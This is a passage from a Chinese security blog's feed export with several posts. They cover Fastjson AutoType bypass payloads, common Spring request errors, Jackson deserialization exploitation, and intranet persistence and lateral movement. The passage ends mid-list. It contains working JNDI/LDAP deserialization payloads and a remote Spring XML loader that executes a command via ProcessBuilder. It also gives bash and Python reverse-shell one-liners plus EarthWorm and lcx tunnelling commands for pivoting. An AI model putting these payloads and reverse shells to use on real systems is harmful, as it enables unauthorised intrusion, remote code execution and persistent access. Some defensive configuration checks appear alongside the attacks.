<h4 id="1-类名混淆"><a href="#1-类名混淆" class="headerlink" title="1. 类名混淆"></a>1. 类名混淆</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Bypass1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-嵌套白名单类"><a href="#2-嵌套白名单类" class="headerlink" title="2. 嵌套白名单类"></a>2. 嵌套白名单类</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ldap://192.168.1.12:8000/Bypass2&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-MyBatis-别名利用"><a href="#3-MyBatis-别名利用" class="headerlink" title="3. MyBatis 别名利用"></a>3. MyBatis 别名利用</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.type.Alias&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Bypass3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="防护检测建议"><a href="#防护检测建议" class="headerlink" title="防护检测建议"></a>防护检测建议</h3><ol>
<li><p><strong>检查 AutoType 状态</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回 true 表示危险</span></span><br><span class="line">ParserConfig.getGlobalInstance().isAutoTypeSupport();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>列出所有白名单</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().getAcceptList()</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>安全配置示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 最佳安全实践</span></span><br><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h2 id="结果分析矩阵"><a href="#结果分析矩阵" class="headerlink" title="结果分析矩阵"></a>结果分析矩阵</h2><table>
<thead>
<tr>
<th align="left">观察现象</th>
<th align="left">漏洞可能性</th>
<th align="left">建议行动</th>
</tr>
</thead>
<tbody><tr>
<td align="left">HTTP 服务器收到 GET 请求</td>
<td align="left">✅ 确认存在</td>
<td align="left">立即修复</td>
</tr>
<tr>
<td align="left">返回 <code>Class not found</code> 错误</td>
<td align="left">⚠️ 可能存在</td>
<td align="left">尝试其他 gadget 类</td>
</tr>
<tr>
<td align="left">返回 <code>autoType not support</code> 错误</td>
<td align="left">🛡️ 可能已防护</td>
<td align="left">检查安全配置</td>
</tr>
<tr>
<td align="left">连接超时</td>
<td align="left">不确定</td>
<td align="left">检查网络策略&#x2F;防火墙</td>
</tr>
<tr>
<td align="left">持续抛出 <code>HttpMessageNotReadable</code></td>
<td align="left">⚠️ 高可能性</td>
<td align="left">分析完整异常栈</td>
</tr>
</tbody></table>
<blockquote>
<p> 即使未观察到直接请求，<code>HttpMessageNotReadableException</code> 异常本身可能已表明 payload 触发了非预期行为，建议结合日志深度分析。</p>
<p><strong>注意：</strong></p>
<p>如下是进行dnslog，即便collaborator有反应也不能说明存在RCE，只能说明存在dns解析</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxxxxxxcollaboratorxxxxxxxxxx.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>spring常见报错构造发包</title>
    <url>/2025/07/03/spring%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>真是一个渗透半个开发</p>
<p>有时根据api直接构造请求包会报错500，不是发不了，只是可能请求头或请求体构造的不一样，已接触的报错记录如下：</p>
<p>Spring MVC、Spring Boot的文件上传报错记录</p>
<p>大致如下：</p>
<table>
<thead>
<tr>
<th>错误提示</th>
<th>常见原因</th>
</tr>
</thead>
<tbody><tr>
<td>not a multipart</td>
<td>没用 multipart&#x2F;form-data</td>
</tr>
<tr>
<td>no boundary</td>
<td>自己写 Content-Type 没有 boundary</td>
</tr>
<tr>
<td>required param missing</td>
<td>必填参数没传</td>
</tr>
<tr>
<td>file too big</td>
<td>超出上传限制</td>
</tr>
<tr>
<td>method not supported</td>
<td>请求方法错</td>
</tr>
<tr>
<td>parse body failed</td>
<td>格式不一致</td>
</tr>
<tr>
<td>missing part</td>
<td>FormData 里漏了某个字段</td>
</tr>
</tbody></table>
<span id="more"></span>



<h2 id="关键字-not-a-multipart"><a href="#关键字-not-a-multipart" class="headerlink" title="关键字&#x3D;&#x3D;&gt;not a multipart"></a>关键字&#x3D;&#x3D;&gt;not a multipart</h2><h5 id="通常出现于文件上传"><a href="#通常出现于文件上传" class="headerlink" title="通常出现于文件上传"></a>通常出现于文件上传</h5><p>详细报错大致如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">current request is not a multipart request</span><br></pre></td></tr></table></figure>

<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="Content-Type：multipart-form-data"><a href="#Content-Type：multipart-form-data" class="headerlink" title="&#x3D;&#x3D;&gt;Content-Type：multipart&#x2F;form-data"></a>&#x3D;&#x3D;&gt;Content-Type：multipart&#x2F;form-data</h5><p>原因如下：</p>
<ol>
<li>前端上传表单没设置 <code>enctype=&quot;multipart/form-data&quot;</code></li>
</ol>
<ul>
<li>如果你用的是 <code>&lt;form&gt;</code> 提交，必须加上：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 其他参数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<ol start="2">
<li>使用 Ajax&#x2F;Fetch 上传时，没用 FormData 对象</li>
</ol>
<ul>
<li>用 JS 上传文件时，必须使用 <code>FormData</code> 对象，并且不能手动设置 <code>Content-Type</code>，浏览器会自动加。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, fileInput.<span class="property">files</span>[<span class="number">0</span>]);</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;term&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/upload&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: formData</span><br><span class="line">  <span class="comment">// 不要手动设置 headers 的 Content-Type</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<hr>
<ol start="3">
<li>后台接口没有正确解析 multipart 请求</li>
</ol>
<ul>
<li>例如在 Spring Boot 中，需要用 <code>@RequestParam MultipartFile file</code> 来接收文件。</li>
<li>还需要确保依赖（如 Commons FileUpload）已导入并且 Multipart 解析已开启。</li>
</ul>
<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>后续可能还会报错说你缺乏什么参数，例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">The request was rejected because no multipart boundary was found</span><br></pre></td></tr></table></figure>

<p>解决方法：</p>
<h5 id="类型后面直接跟参数即可"><a href="#类型后面直接跟参数即可" class="headerlink" title="类型后面直接跟参数即可"></a>类型后面直接跟参数即可</h5><p>例如：</p>
<p>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundaryxxxxxx</p>
<p>请求体注意同样，我的建议是直接在同一个网址下找到另外一个文件上传，直接copy过来，或者找到对应的js，直接本地部署一下，实话说能不猜就别猜</p>
<h2 id="关键字-is-not-present"><a href="#关键字-is-not-present" class="headerlink" title="关键字&#x3D;&#x3D;&gt;is not present"></a>关键字&#x3D;&#x3D;&gt;is not present</h2><p>全称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">required string parameter &#x27;xxx&#x27; is not present</span><br></pre></td></tr></table></figure>

<p>意思是少了一个参数，直接把xxx接在url后面就行了</p>
<h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="param-xxx"><a href="#param-xxx" class="headerlink" title="&#x3D;&#x3D;&gt;?param&#x3D;&amp;xxx&#x3D;"></a>&#x3D;&#x3D;&gt;?param&#x3D;&amp;xxx&#x3D;</h5><h5 id="form-data-name-”parm”"><a href="#form-data-name-”parm”" class="headerlink" title="&#x3D;&#x3D;&gt;form-data;name&#x3D;”parm”"></a>&#x3D;&#x3D;&gt;form-data;name&#x3D;”parm”</h5><p>第二中方法适用于上传多参数：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">----WebKitFormBoundaryxxxxxx---</span><br><span class="line"></span><br><span class="line">content-Disposition: form-data; name=&quot;parm&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">math</span><br><span class="line"></span><br><span class="line">----WebKitFormBoundaryxxxxxx---</span><br></pre></td></tr></table></figure>

<h2 id="关键字-Failed-to-parse"><a href="#关键字-Failed-to-parse" class="headerlink" title="关键字&#x3D;&#x3D;&gt;Failed to parse"></a>关键字&#x3D;&#x3D;&gt;Failed to parse</h2><p>全称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Failed to parse multipart servlet request</span><br></pre></td></tr></table></figure>

<p>意思是文件过大了</p>
<h3 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="减少内容"><a href="#减少内容" class="headerlink" title="&#x3D;&#x3D;&gt;减少内容"></a>&#x3D;&#x3D;&gt;减少内容</h5><h2 id="关键字-”xxx”-not-supported"><a href="#关键字-”xxx”-not-supported" class="headerlink" title="关键字&#x3D;&#x3D;&gt;”xxx” not supported"></a>关键字&#x3D;&#x3D;&gt;”xxx” not supported</h2><p>全称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Request method &#x27;POST&#x27; not supported</span><br></pre></td></tr></table></figure>

<p>意思是不支持post</p>
<h3 id="解决方法-3"><a href="#解决方法-3" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="”POST”-”GET”"><a href="#”POST”-”GET”" class="headerlink" title="&#x3D;&#x3D;&gt;”POST”&#x3D;&#x3D;&gt;”GET”"></a>&#x3D;&#x3D;&gt;”POST”&#x3D;&#x3D;&gt;”GET”</h5><h2 id="关键字-request-body"><a href="#关键字-request-body" class="headerlink" title="关键字&#x3D;&#x3D;&gt;request body"></a>关键字&#x3D;&#x3D;&gt;request body</h2><p>全称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Could not parse request body</span><br></pre></td></tr></table></figure>

<p>前端发的是 JSON，但后端没用 <code>@RequestBody</code> 接收；或者反之。</p>
<h3 id="解决方法-4"><a href="#解决方法-4" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="修改请求体"><a href="#修改请求体" class="headerlink" title="&#x3D;&#x3D;&gt;修改请求体"></a>&#x3D;&#x3D;&gt;修改请求体</h5>]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>jackson反序列化漏洞分析</title>
    <url>/2025/07/02/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="1-反序列化"><a href="#1-反序列化" class="headerlink" title="1-反序列化"></a>1-反序列化</h1><h2 id="1-jackson记录"><a href="#1-jackson记录" class="headerlink" title="[1] jackson记录"></a>[1] jackson记录</h2><p>以目的为导向就是，用[]进行测试判断该参数是否为object类型，是则用ssrf的payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;javax.swing.JEditorPane&quot;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;page&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://你的服务ip:8000&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span>	</span><br></pre></td></tr></table></figure>

<p>来测试是否存在jackson的反序列漏洞</p>
<span id="more"></span>

<p>参考文章<a href="https://zhuanlan.zhihu.com/p/344568487">Jackson反序列化漏洞 - 知乎</a></p>
<h3 id="Jackson-反序列化漏洞原理"><a href="#Jackson-反序列化漏洞原理" class="headerlink" title="Jackson 反序列化漏洞原理"></a>Jackson 反序列化漏洞原理</h3><h5 id="1-1-多态反序列化（Polymorphic-Deserialization）"><a href="#1-1-多态反序列化（Polymorphic-Deserialization）" class="headerlink" title="1.1 多态反序列化（Polymorphic Deserialization）"></a>1.1 多态反序列化（Polymorphic Deserialization）</h5><p>Jackson 支持将 JSON 自动反序列化为多种类型的 Java 对象，特别是当某字段的类型为 <code>Object</code>、接口或抽象类时，Jackson 允许通过类型信息确定具体类。</p>
<h5 id="常见两种类型标识方式："><a href="#常见两种类型标识方式：" class="headerlink" title="常见两种类型标识方式："></a>常见两种类型标识方式：</h5><ul>
<li><p><strong>外部数组型标识（默认启用）</strong>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;com.example.SomeClass&quot;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;value&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>注解型标识（显式开启）</strong>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.example.SomeClass&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;value&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>1.2 漏洞产生的根因</p>
<ul>
<li>Jackson 允许用户从 JSON 中指定任意类名。</li>
<li>反序列化时会自动调用类的构造函数、setter 或 <code>readObject</code> 方法，甚至可能触发危险行为。</li>
<li>攻击者可伪造 payload 利用 Gadget（利用链）执行任意代码。</li>
</ul>
<h5 id="1-3-默认-Typing-的影响"><a href="#1-3-默认-Typing-的影响" class="headerlink" title="1.3 默认 Typing 的影响"></a>1.3 默认 Typing 的影响</h5><p>如果后端配置了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">mapper.enableDefaultTyping(); <span class="comment">// 旧版本默认启用</span></span><br></pre></td></tr></table></figure>

<p>那么所有非 final 类型（如 Object、Map、List 等）都会被自动启用多态反序列化</p>
<h3 id="—-Fastjson对比—"><a href="#—-Fastjson对比—" class="headerlink" title="—-Fastjson对比—-"></a>—-Fastjson对比—-</h3><table>
<thead>
<tr>
<th>特性</th>
<th>Jackson</th>
<th>Fastjson</th>
</tr>
</thead>
<tbody><tr>
<td>是否支持多态反序列化</td>
<td>✅ 支持（默认 Object 类型自动支持）</td>
<td>✅ 支持（需要特定字段）</td>
</tr>
<tr>
<td>默认是否开启</td>
<td>✅ <code>Object</code>, <code>Object[]</code> 自动支持多态</td>
<td>❌ 需显示写入 <code>@type</code></td>
</tr>
<tr>
<td>多态字段名称</td>
<td>类名写在数组或配置的 <code>@class</code> 字段中</td>
<td><strong>@type</strong>（固定字段名）</td>
</tr>
<tr>
<td>利用条件</td>
<td>字段为 Object 或接口（或启用了 DefaultTyping）</td>
<td>JSON 中有 <code>@type</code> 且服务未禁用 AutoType</td>
</tr>
<tr>
<td>修复方法</td>
<td>禁用 DefaultTyping、白名单类</td>
<td>关闭 <code>autoTypeSupport</code>、升级版本、白名单</td>
</tr>
<tr>
<td>gadget 丰富程度</td>
<td>中等（依赖 commons-* 等库）</td>
<td>非常多（内置支持多类库）</td>
</tr>
</tbody></table>
<h2 id="2-推荐工具利用"><a href="#2-推荐工具利用" class="headerlink" title="[2]推荐工具利用"></a>[2]推荐工具利用</h2><p><a href="https://github.com/mbechler/marshalsec">marshalsec</a></p>
<p>生成恶意 LDAP&#x2F;RMI 服务，配合 Java 反序列化漏洞实现 RCE</p>
<p><strong>简单exp：</strong></p>
<p>payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span><span class="punctuation">,</span> <span class="string">&quot;http://192.168.1.12:8000/sping-beans.xml&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>sping-beans.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;payload&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Backend</tag>
      </tags>
  </entry>
  <entry>
    <title>emby逆向记录</title>
    <url>/2025/06/24/emby%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h1><p>参考文章<a href="https://www.52pojie.cn/thread-1847431-1-1.html">破解Emby Server&#x2F;Client For iOS&#x2F;MacOS&#x2F;Linux&#x2F;Android 通杀方案 - 吾爱破解 - 52pojie.cn</a></p>
<p>逆向案例，但好像也只解决的显示问题，对于硬解，可能需要搭建服务器传输必要参数内容才行。</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>内网横向+加固</title>
    <url>/2025/06/24/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E5%8A%A0%E5%9B%BA/</url>
    <content><![CDATA[<h1 id="1-加固"><a href="#1-加固" class="headerlink" title="1-加固"></a>1-加固</h1><h2 id="Reverse-Shell定时任务"><a href="#Reverse-Shell定时任务" class="headerlink" title="Reverse Shell定时任务"></a>Reverse Shell定时任务</h2><h3 id="定时任务-系统级或用户级自启"><a href="#定时任务-系统级或用户级自启" class="headerlink" title="#定时任务&amp;系统级或用户级自启"></a>#定时任务&amp;系统级或用户级自启</h3><h5 id="反向ssh"><a href="#反向ssh" class="headerlink" title="#反向ssh"></a>#反向ssh</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ssh -R <span class="number">6000</span>:localhost:<span class="number">22</span> user@A的公网IP</span><br></pre></td></tr></table></figure>

<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="#反弹shell"></a>#反弹shell</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>#python</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="使用-Zerotier-Tailscale-搭建虚拟局域网"><a href="#使用-Zerotier-Tailscale-搭建虚拟局域网" class="headerlink" title="#使用 Zerotier &#x2F; Tailscale 搭建虚拟局域网"></a>#使用 Zerotier &#x2F; Tailscale 搭建虚拟局域网</h5><p>或者使用sock代理，处于同一网络易漏扫，连接方式，下载<a href="https://github.com/idlefire/ew">EarthWorm</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ew -s rcsocks -l <span class="number">1900</span> -e <span class="number">1200</span></span><br><span class="line">ew -s rssocks -d xxx.xxx.xxx.xxx(公网VPS IP) -e <span class="number">1200</span></span><br></pre></td></tr></table></figure>

<h5 id="内存码的注入"><a href="#内存码的注入" class="headerlink" title="#内存码的注入"></a>#内存码的注入</h5><h5 id="cs木马"><a href="#cs木马" class="headerlink" title="#cs木马"></a>#cs木马</h5><span id="more"></span>

<h1 id="2-横向"><a href="#2-横向" class="headerlink" title="2-横向"></a>2-横向</h1><h2 id="内网探测"><a href="#内网探测" class="headerlink" title="#内网探测"></a>#内网探测</h2><h5 id="探测主机-端口"><a href="#探测主机-端口" class="headerlink" title="#探测主机+端口"></a>#探测主机+端口</h5><p>详细可见另外一篇文章<a href="https://cliayn.github.io/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">内网信息搜集</a></p>
<p>若使用了sock，则直接使用nmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.1.0/24</span><br><span class="line"></span><br><span class="line">#端口扫描</span><br><span class="line">nmap -p 1-65535 192.168.1.100</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">   #ladon上传到目标系统中，通过ladon扫描内网系统</span><br><span class="line">landon <span class="number">192</span>.<span class="number">168</span>.<span class="number">200</span>.<span class="number">1</span>/<span class="number">24</span>    OsScan	</span><br><span class="line">#直接漏扫</span><br><span class="line">landon <span class="number">192</span>.<span class="number">168</span>.<span class="number">200</span>.<span class="number">1</span>/<span class="number">24</span> 漏洞类型</span><br><span class="line">#连接sock5漏扫</span><br><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure>

<p>若没有，则使用ping</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.&#123;<span class="number">1</span>..<span class="number">254</span>&#125;; <span class="keyword">do</span> <span class="built_in">ping</span> -c <span class="number">1</span> -W <span class="number">1</span> $ip &amp;&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> &quot;$ip is up&quot;; done</span><br><span class="line"></span><br><span class="line">#查看arp缓存</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="#内网渗透"></a>#内网渗透</h2><h5 id="排查服务"><a href="#排查服务" class="headerlink" title="#排查服务"></a>#排查服务</h5><p>处于同一虚拟局域网内直接<strong>主机渗透</strong>和<strong>web渗透</strong></p>
<h5 id="排查备份"><a href="#排查备份" class="headerlink" title="#排查备份"></a>#排查备份</h5><p>存在快照&#x2F;镜像直接拷贝本地运行</p>
<h5 id="排查数据库"><a href="#排查数据库" class="headerlink" title="#排查数据库"></a>#排查数据库</h5><h5 id="排查敏感端口"><a href="#排查敏感端口" class="headerlink" title="#排查敏感端口"></a>#排查敏感端口</h5><h5 id="排查密码箱"><a href="#排查密码箱" class="headerlink" title="#排查密码箱"></a>#排查密码箱</h5><p>尝试mimikatz解密哈希</p>
<h1 id="补充知识"><a href="#补充知识" class="headerlink" title="#补充知识"></a>#补充知识</h1><p>详细可见—戟星安全实验室的<a href="https://github.com/MrWQ/vulnerability-paper/blob/b60b05e87904b834ef707eaf18ca5c15eb972edf/intranet/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%EF%BC%8C%E4%BD%A0%E7%9F%A5%E9%81%93%E5%87%A0%E4%B8%AA%EF%BC%9F.md">内网隧道技术</a></p>
<h2 id="1-lcx-隧道（针对-exe-工具的案例）"><a href="#1-lcx-隧道（针对-exe-工具的案例）" class="headerlink" title="1. lcx 隧道（针对 .exe 工具的案例）"></a>1. lcx 隧道（针对 .exe 工具的案例）</h2><p><strong>目标机器（受控端）执行：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 攻击机IP 9999 127.0.0.1 3389</span><br></pre></td></tr></table></figure>

<ul>
<li>将本地 3389 端口的连接转发至攻击机 IP:9999。</li>
</ul>
<p><strong>VPS 或攻击机（监听端）执行：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 9999 10000</span><br></pre></td></tr></table></figure>

<ul>
<li>监听 9999 端口接收隧道数据，并将其转发至本地 10000 端口。</li>
</ul>
<p><strong>连接方式：</strong></p>
<ul>
